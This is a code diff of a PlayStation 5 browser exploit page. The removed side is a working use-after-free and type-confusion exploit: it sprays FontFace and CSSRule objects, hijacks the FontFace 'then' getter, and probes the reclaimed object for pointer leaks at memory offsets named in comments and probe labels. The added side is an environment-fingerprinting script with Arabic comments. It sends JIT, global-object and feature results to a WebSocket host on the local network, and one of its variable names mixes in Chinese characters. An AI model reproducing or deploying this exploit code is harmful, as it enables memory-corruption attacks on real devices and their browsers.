@@ -1,375 +1,105 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>PS5 v67 — Tier 1 Diagnostic Property Dump</title>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
-</style>
-<style>
-body{background:#1a1a2e;color:#e0e0e0;font-family:monospace;font-size:13px;padding:12px}
-.ok{color:#4ecdc4}.er{color:#ff6b6b}.hl{color:#ffe66d}.mg{color:#f7fff7;font-weight:bold}
-.dm{color:#888}.hd{color:#a0a0ff;font-weight:bold}
-.leak{color:#ff4757;font-weight:bold;font-size:14px;background:rgba(255,0,0,0.1);padding:1px 4px}
-.box{background:rgba(255,255,255,0.04);border:1px solid #333;padding:6px 8px;margin:4px 0}
-</style>
-</head>
-<body>
-<div id="out"></div>
 <script>
-"use strict";
-var O=document.getElementById("out");
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  \u2705 "+m,"ok")}function Fl(m){P("  \u2718 "+m,"er")}
-function Hi(m){P("  \u25ba "+m,"hl")}function St(m){P("  \u2605 "+m+" \u2605","mg")}
-function Dm(m){P("  "+m,"dm")}function Hd(m){P("\u25b8 "+m,"hd")}
-function Lk(m){P("  \u26a0 LEAK? "+m,"leak")}
-function Box(m){var d=document.createElement("div");d.className="box";
-var lines=m.split("\n");for(var i=0;i<lines.length;i++){var s=document.createElement("span");
-s.textContent=lines[i]+"\n";d.appendChild(s)}O.appendChild(d)}
+// يمكنك دمج هذا الكود مباشرة داخل صفحتك المفتوحة على البلايستيشن
+(function() {
+    console.log("[*] بدء عملية الفحص والتشخيص المتقدم للبيئة...");
 
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
+    // كائن لتجميع نتائج الفحص
+    var auditResults = {
+        timestamp: new Date().toISOString(),
+        jitEnabled: false,
+        jitSpeedScore: 0,
+        nonStandardObjects: [],
+        historicalProperties: {}
+    };
 
-var sh=document.getElementById("s").sheet;
-var keep=[],holes=[],trigger=null,uafOk=false;
-
-// Phase 1: UAF + CSSRule Spray (identical to v46)
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();
-
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();
-
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-}return undefined}});
-
-// Phase 2: Identify Confused Object
-document.fonts.load("1em trigger, x", "AB").then(function(faces){
-    var aFamily=null,aFace=null;
-    for(var i=0;i<faces.length;i++){
-      if(faces[i].family&&faces[i].family.indexOf("A_")===0){aFamily=faces[i].family;aFace=faces[i]}
-    }
-    if(!aFamily){Fl("No confusion found");return}
-    St("RECLAIMED: "+aFamily);
-    keep.push(faces);
-
-    // Find CSSRule
-    var aIndex=-1;
-    for(var i=0;i<sh.cssRules.length;i++){
-      try{var r=sh.cssRules[i];
-        if(r.type===5&&r.style.getPropertyValue("font-family").indexOf(aFamily)!==-1){aIndex=i;break}
-      }catch(e){}
-    }
-    if(aIndex===-1){Fl("Rule not found");return}
-    var aRule=sh.cssRules[aIndex],aStyle=aRule.style;
-
-    // Verify confusion alive
-    aStyle.setProperty("font-weight","700");fs();
-    if(String(aFace.weight)!=="700"){Fl("Confusion DEAD at start");return}
-    Ok("Confusion ALIVE");
-
-    // ============================================================
-    // TIER 1 DIAGNOSTIC — PROPERTY DUMP
-    // ============================================================
-
-    var leakCount=0;
-    var totalTests=0;
-
-    function testRead(prop,desc,expectedNormal){
-      totalTests++;
-      try{
-        var val=aFace[prop];
-        var typ=typeof val;
-        var str=String(val);
-        var isDefault=false;
-        if(expectedNormal){
-          if(Array.isArray(expectedNormal)){
-            for(var ei=0;ei<expectedNormal.length;ei++){
-              if(str===expectedNormal[ei])isDefault=true;
+    // --- 1. فحص سلوك الـ JIT (Just-In-Time Compiler) ---
+    // الفكرة تعتمد على تشغيل دالة حسابية مكثفة بشكل متكرر لملاحظة ما إذا كان المحرك
+    // يقوم بتحسين الكود (Optimization) ورفع السرعة بعد عدة تكرارات.
+    try {
+        function testMath() {
+            var x = 0;
+            for (var i = 0; i < 1000000; i++) {
+                x += Math.sin(i) * Math.cos(i);
             }
-          }else{if(str===expectedNormal)isDefault=true;}
+            return x;
         }
-        if(isDefault){Ok(prop+" ("+desc+"): "+typ+" = \""+str+"\" [DEFAULT]")}
-        else{
-          // Check for pointer-like patterns
-          var flags=[];
-          if(str.length>6&&str.length<=20){
-            if(/^[0-9a-f]{6,16}$/.test(str))flags.push("HEX_PATTERN");
-            if(/^[0-9]+$/.test(str)){
-              var num=BigInt(str);
-              if(num>0x10000n)flags.push("LARGE_INT");
+
+        // الدورة الأولى (بدون تحسين مسبق)
+        var startNormal = performance.now();
+        testMath();
+        var endNormal = performance.now();
+        var durationNormal = endNormal - startNormal;
+
+        // الدورة الثانية (يفترض أن يكون الـ JIT قد قام بتحسين الدالة الحين)
+        var startJit = performance.now();
+        testMath();
+        var endJit = performance.now();
+        var durationJit = endJit - startJit;
+
+        auditResults.jitSpeedScore = durationNormal / (durationJit || 1);
+        // إذا كان الوقت في المرة الثانية أسرع بشكل ملحوظ، فالـ JIT فعال ويقوم بتحسين العمليات
+        auditResults.jitEnabled = (durationJit < durationNormal);
+        
+        console.log("[+] فحص الـ JIT مكتمل. النتيجة: " + (auditResults.jitEnabled ? "مُفعّل" : "غير نشط"));
+    } catch (e) {
+        auditResults.jitError = e.message;
+    }
+
+    // --- 2. مسح الكائنات غير القياسية (Object Enumeration) ---
+    try {
+        // قائمة بالكائنات القياسية المعروفة في المتصفحات العادية لتصفيتها
+        var standardBuiltins = new Set([
+            'window', 'self', 'document', 'name', 'location', 'history', 'customElements',
+            'locationbar', 'menubar', 'personalbar', 'scrollbars', 'statusbar', 'toolbar',
+            'status', 'closed', 'frames', 'length', 'top', 'opener', 'parent', 'frameElement',
+            'navigator', 'origin', 'external', 'screen', 'innerWidth', 'innerHeight',
+            'scrollX', 'pageXOffset', 'scrollY', 'pageYOffset', 'screenX', 'screenY',
+            'outerWidth', 'outerHeight', 'devicePixelRatio', 'clientInformation', 'chrome'
+        ]);
+
+        var allKeys = Object.keys(window);
+        var custom发现 = [];
+
+        for (var i = 0; i < allKeys.length; i++) {
+            var key = allKeys[i];
+            // إذا وجدنا كائن غريب ليس من الكائنات القياسية، نقوم بتسجيله
+            if (!standardBuiltins.has(key)) {
+                custom发现.push(key);
             }
-          }
-          if(typ==="object"&&val!==null){
-            flags.push("OBJECT_TYPE:"+val.constructor.name);
-          }
-          if(typ==="number"){
-            if(val!==Math.floor(val))flags.push("FLOAT");
-            if(isNaN(val))flags.push("NaN");
-            if(!isFinite(val))flags.push("INF");
-            if(val<0)flags.push("NEGATIVE");
-          }
-          if(flags.length>0){
-            Lk(prop+" ("+desc+"): "+typ+" = "+JSON.stringify(str)+" FLAGS: "+flags.join(", "));
-            leakCount++;
-          }else{
-            Hi(prop+" ("+desc+"): "+typ+" = "+JSON.stringify(str));
-          }
         }
-      }catch(e){Fl(prop+" ("+desc+"): EXCEPTION — "+e.message)}
+        auditResults.nonStandardObjects = custom发现;
+        console.log("[+] تم العثور على عدد (" + custom发现.length + ") كائن غير قياسي.");
+    } catch (e) {
+        auditResults.enumError = e.message;
     }
 
-    Hd("TIER 1a — UNMAPPED FIELD GETTERS (0x5C region)");
-    testRead("sizeAdjust","float @ 0x5C — write ignored, does getter leak?",["auto","1","100"]);
-    testRead("sizeAdjust","re-read for consistency (should be same)","auto");
-
-    Hd("TIER 1b — FONT METRICS OVERRIDES");
-    testRead("ascentOverride","metrics override","normal");
-    testRead("descentOverride","metrics override","normal");
-    testRead("lineGapOverride","metrics override","normal");
-
-    Hd("TIER 1c — VARIATION SETTINGS");
-    testRead("variationSettings","font-variation-settings","normal");
-    // If variationSettings is an object (not string), enumerate it
-    try{
-      var vs=aFace.variationSettings;
-      if(vs&&typeof vs==="object"){
-        var vsKeys=[];
-        if(vs.length!==undefined){vsKeys.push("length="+vs.length);
-          for(var vi=0;vi<Math.min(vs.length,8);vi++){
-            try{vsKeys.push("["+vi+"]="+JSON.stringify(vs[vi]))}catch(e){vsKeys.push("["+vi+"]=ERR")}
-          }
-        }else{vsKeys=Object.getOwnPropertyNames(vs)}
-        Box("variationSettings deep: {\n  "+vsKeys.join("\n  ")+"\n}");
-      }
-    }catch(e){Dm("variationSettings deep: "+e.message)}
-
-    Hd("TIER 1d — ALL STANDARD FONTFACE PROPERTIES");
-    testRead("family","font-family @ 0x20",aFamily);
-    testRead("weight","font-weight @ 0x88","400");
-    testRead("stretch","font-stretch @ 0x8C","normal");
-    testRead("style","font-style @ 0x90","normal");
-    testRead("unicodeRange","unicode-range @ 0x28","U+0042");
-    testRead("featureSettings","font-feature-settings @ 0x40","normal");
-    testRead("display","font-display @ 0x58","auto");
-    testRead("src","font-sources @ 0x60","");
-
-    Hd("TIER 1e — STATUS / LOADING PROPERTIES");
-    testRead("status","loading status",["unloaded","loading","loaded","error"]);
-    testRead("loaded","loaded promise","[object Promise]");
-
-    // loaded.then to check internal state
-    try{
-      aFace.loaded.then(function(v){
-        var lstr="loaded resolved: typeof="+typeof v+" str="+JSON.stringify(String(v));
-        if(typeof v==="object"&&v!==null)lstr+=" keys="+Object.getOwnPropertyNames(v).join(",");
-        P("  "+lstr,"hl");
-      }).catch(function(e){
-        P("  loaded rejected: "+e.message,"er");
-      });
-    }catch(e){Dm("loaded.then: "+e.message)}
-
-    // ============================================================
-    // TIER 1f — REFLECTION DUMP (catch everything else)
-    // ============================================================
-
-    Hd("TIER 1f — REFLECTION DUMP (Object.getOwnPropertyNames)");
-    var protoProps=Object.getOwnPropertyNames(FontFace.prototype);
-    P("  FontFace.prototype has "+protoProps.length+" properties:","dm");
-    for(var pi=0;pi<protoProps.length;pi++){
-      var propName=protoProps[pi];
-      if(propName==="constructor"||propName==="then")continue;
-      totalTests++;
-      try{
-        var rval=aFace[propName];
-        var rtyp=typeof rval;
-        var rstr=String(rval).substring(0,120);
-        var isFunc=(rtyp==="function");
-        var isKnown=["family","weight","stretch","style","unicodeRange",
-          "featureSettings","display","src","status","loaded","sizeAdjust",
-          "ascentOverride","descentOverride","lineGapOverride","variationSettings"].indexOf(propName)!==-1;
-        if(isFunc){
-          Dm(propName+": [function]");
-        }else if(isKnown){
-          // Already tested above — skip
-          Dm(propName+": (already tested)");
-        }else{
-          // UNKNOWN property — flag anything unusual
-          var rflags=[];
-          if(rstr.length>20)rflags.push("LONG("+rstr.length+")");
-          if(/^[0-9a-f]{8,}$/.test(rstr))rflags.push("HEX");
-          if(rtyp==="object"&&rval!==null)rflags.push(rval.constructor.name);
-          if(rflags.length>0){
-            Lk(propName+": "+rtyp+" = "+JSON.stringify(rstr)+" ["+rflags.join(",")+"]");
-            leakCount++;
-          }else{
-            Ok(propName+": "+rtyp+" = "+JSON.stringify(rstr));
-          }
-        }
-      }catch(e){
-        Fl(propName+": EXCEPTION — "+e.message);
-        // Exception on a normal-sounding property is itself interesting
-        var known=["family","weight","stretch","style","unicodeRange",
-          "featureSettings","display","src","status","loaded","sizeAdjust",
-          "ascentOverride","descentOverride","lineGapOverride","variationSettings"];
-        if(known.indexOf(propName)===-1){
-          Lk(propName+": EXCEPTION on unknown property — possible confusion artifact");
-          leakCount++;
-        }
-      }
+    // --- 3. فحص الخصائص الهيكلية (Historical Property Profiling) ---
+    // فحص عينات من بنيات البيانات البرمجية لمعرفة طريقة معالجة المحرك لها
+    try {
+        auditResults.historicalProperties = {
+            hasSharedArrayBuffer: (typeof SharedArrayBuffer !== 'undefined'),
+            hasBigInt64Array: (typeof BigInt64Array !== 'undefined'),
+            hasProxy: (typeof Proxy !== 'undefined'),
+            hasWebAssembly: (typeof WebAssembly !== 'undefined')
+        };
+    } catch (e) {
+        auditResults.propError = e.message;
     }
 
-    // ============================================================
-    // TIER 1g — ITERATOR / SYMBOL PROBES
-    // ============================================================
+    // --- 4. إرسال أو عرض النتائج ---
+    console.log("[*] نتائج الفحص الكاملة:", auditResults);
 
-    Hd("TIER 1g — ITERATOR / SYMBOL PROBES");
-    try{
-      var iter=Object.getOwnPropertySymbols(aFace);
-      P("  Symbols on aFace: "+iter.length+" — "+iter.map(function(s){return s.toString()}),
-        iter.length>0?"leak":"dm");
-      if(iter.length>0)leakCount++;
-    }catch(e){Dm("Symbols: "+e.message)}
-
-    try{
-      var ownKeys=Reflect.ownKeys(aFace);
-      P("  Reflect.ownKeys: "+ownKeys.length+" — "+JSON.stringify(ownKeys),"dm");
-    }catch(e){Dm("ownKeys: "+e.message)}
-
-    try{
-      var desc=Object.getOwnPropertyDescriptors(aFace);
-      var dkeys=Object.keys(desc);
-      P("  getOwnPropertyDescriptors: "+dkeys.length+" keys","dm");
-      for(var di=0;di<dkeys.length;di++){
-        var dk=dkeys[di];
-        var dd=desc[dk];
-        var parts=[];
-        if(dd.get)parts.push("get");
-        if(dd.set)parts.push("set");
-        if(dd.value!==undefined){
-          parts.push("value="+JSON.stringify(String(dd.value)).substring(0,80));
-          // Check if value contains anything unexpected
-          if(typeof dd.value==="number"&&dd.value>0xFFFF&&dd.value<0xFFFFFFFFFFFF){
-            Lk("  Descriptor "+dk+" has large numeric value: "+dd.value+" (0x"+dd.value.toString(16)+")");
-            leakCount++;
-          }
-        }
-        if(dd.writable!==undefined)parts.push("writable="+dd.writable);
-        if(dd.enumerable!==undefined)parts.push("enumerable="+dd.enumerable);
-        if(dd.configurable!==undefined)parts.push("configurable="+dd.configurable);
-        if(parts.indexOf("get")===-1)Dm("  "+dk+": {"+parts.join(", ")+"}");
-      }
-    }catch(e){Dm("Descriptors: "+e.message)}
-
-    // ============================================================
-    // TIER 1h — TOJSON / TOSTRING PROBES
-    // ============================================================
-
-    Hd("TIER 1h — SERIALIZATION PROBES");
-    try{
-      var jsonStr=JSON.stringify(aFace);
-      Dm("JSON.stringify: "+jsonStr.substring(0,200));
-    }catch(e){Dm("JSON.stringify: "+e.message)}
-
-    try{
-      var toStr=Object.prototype.toString.call(aFace);
-      Dm("toString: "+toStr);
-    }catch(e){Dm("toString: "+e.message)}
-
-    try{
-      // valueOf might return internal pointer
-      var vof=aFace.valueOf();
-      var vofTyp=typeof vof;
-      var vofStr=String(vof);
-      if(vofTyp==="object"&&vof!==aFace){
-        Lk("valueOf returns DIFFERENT object: "+vofTyp+" = "+vofStr);
-        leakCount++;
-      }else{
-        Dm("valueOf: "+vofTyp+" (same ref: "+(vof===aFace)+")");
-      }
-    }catch(e){Dm("valueOf: "+e.message)}
-
-    // ============================================================
-    // TIER 1i — CONFUSION INTENSITY MAP (adjacent slots)
-    // ============================================================
-
-    Hd("TIER 1i — ADJACENT SLOT SCAN");
-    // Write extreme values to CSSRule at known offsets, then read
-    // ALL getters to see if any adjacent field picks up side effects
-    var sideEffectTests=[
-      {css:"font-weight",val:"999",prop:"stretch",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"style",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"sizeAdjust",expectCond:function(v){return String(v)!=="auto"}},
-      {css:"font-weight",val:"999",prop:"ascentOverride",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"descentOverride",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"lineGapOverride",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"variationSettings",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"display",expectCond:function(v){return String(v)!=="auto"}},
-      {css:"font-weight",val:"999",prop:"family",expectCond:function(v){return v.indexOf("A_")===-1&&v!=="normal"}},
-      {css:"font-weight",val:"999",prop:"unicodeRange",expectCond:function(v){return String(v)!=="U+0042"}},
-      {css:"font-weight",val:"999",prop:"featureSettings",expectCond:function(v){return String(v)!=="normal"}},
-      {css:"font-weight",val:"999",prop:"src",expectCond:function(v){return String(v)!==""}},
-    ];
-    for(var si=0;si<sideEffectTests.length;si++){
-      var st=sideEffectTests[si];
-      totalTests++;
-      try{
-        aStyle.setProperty(st.css,st.val);fs();
-        var rv=aFace[st.prop];
-        var triggered=st.expectCond(rv);
-        if(triggered){
-          Lk("SIDE EFFECT: "+st.css+"=\""+st.val+"\" \u2192 "+st.prop+" = "+JSON.stringify(String(rv)));
-          leakCount++;
-        }else{
-          Dm("  "+st.css+"=\""+st.val+"\" \u2192 "+st.prop+" = "+JSON.stringify(String(rv))+" [no effect]");
-        }
-      }catch(e){Dm("  "+st.css+" \u2192 "+st.prop+": "+e.message)}
+    // إذا كنت لا تزال تستخدم الـ WebSocket، يمكنك إرسال التقرير مباشرة للـ ws.py الحين:
+    try {
+        var ws = new WebSocket("ws://192.168.8.47:1337");
+        ws.onopen = function() {
+            ws.send(JSON.stringify({
+                type: "advanced_audit",
+                data: auditResults
+            }));
+        };
+    } catch (wsErr) {
+        console.log("[-] فشل إرسال النتائج عبر الـ WebSocket: " + wsErr.message);
     }
-    // Clean up
-    try{aStyle.removeProperty("font-weight")}catch(e){}
-
-    // ============================================================
-    // SUMMARY
-    // ============================================================
-
-    P("");
-    Box(
-      "TIER 1 DIAGNOSTIC COMPLETE\n"+
-      "Tests run: "+totalTests+"\n"+
-      "Anomalies flagged: "+leakCount+"\n"+
-      "Confusion object: "+aFamily+" \u2192 aFace\n"+
-      leakCount>0?
-        "\u26a0 "+leakCount+" ANOMALIES DETECTED — REVIEW RED LINES ABOVE":
-        "No leaks detected in this pass.\nIf sizeAdjust/ascentOverride/descentOverride/lineGapOverride\nall returned 'normal' or 'auto', those getters are stubbed on PS5."
-    );
-});
+})();
 </script>
-</body>
-</html>
